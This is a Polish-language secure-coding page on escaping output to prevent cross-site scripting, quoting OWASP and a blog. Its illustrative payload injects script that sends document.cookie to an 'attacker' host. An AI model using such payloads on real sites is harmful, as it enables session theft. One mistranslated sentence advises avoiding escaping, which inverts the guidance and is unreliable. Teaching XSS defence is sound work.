# Escape Output

### Wyjaśnienie jednym akapitem

HTML i inne języki internetowe mieszają zawartość z kodem wykonywalnym - pojedynczy akapit HTML może zawierać wizualną reprezentację danych wraz z instrukcjami wykonywania JavaScript. Podczas renderowania HTML lub zwracania danych z API uważamy, że czysta treść może w rzeczywistości zawierać kod JavaScript, który zostanie zinterpretowany i wykonany przez przeglądarkę. Dzieje się tak na przykład podczas renderowania treści wstawionych przez osobę atakującą do bazy danych - na przykład `<div> <script> // szkodliwy kod </script> </div>`. Można to złagodzić, instruując przeglądarkę, aby traktowała każdą część niezaufanych danych tylko jako treść i nigdy jej nie interpretowała - ta technika nazywa się ucieczką. Wiele bibliotek NPM i silników szablonów HTML zapewnia możliwość zmiany znaczenia (przykład: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). Należy unikać ucieczki nie tylko treści HTML, ale także CSS i JavaScript

### Przykład kodu - Nie umieszczaj niezaufanych danych w swoim HTML

```html
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### Przykład kodu - złośliwe treści, które mogą zostać wstrzyknięte do bazy danych

```html
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Cytat na blogu: „Gdy nie chcemy, aby znaki były interpretowane”

Z Bloga [benramsey.com](https://benramsey.com/articles/escape-output/)
> Data may leave your application in the form of HTML sent to a Web browser, SQL sent to a database, XML sent to an RSS reader, WML sent to a wireless device, etc. The possibilities are limitless. Each of these has its own set of special characters that are interpreted differently than the rest of the plain text received. Sometimes we want to send these special characters so that they are interpreted (HTML tags sent to a Web browser, for example), while other times (in the case of input from users or some other source), we don’t want the characters to be interpreted, so we need to escape them.

> Escaping is also sometimes referred to as encoding. In short, it is the process of representing data in a way that it will not be executed or interpreted. For example, HTML will render the following text in a Web browser as bold-faced text because the `<strong>` tags have special meaning:
> ```html
> <strong>This is bold text.</strong>
> ```

<br/><br/>

### Cytat na blogu: "OWASP recommends using a security-focused encoding library"

Z bloga OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. **OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented**."


<br/><br/>

### Cytat na blogu: "You MUST use the escape syntax for the part of the HTML"

Z bloga OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "But HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into."
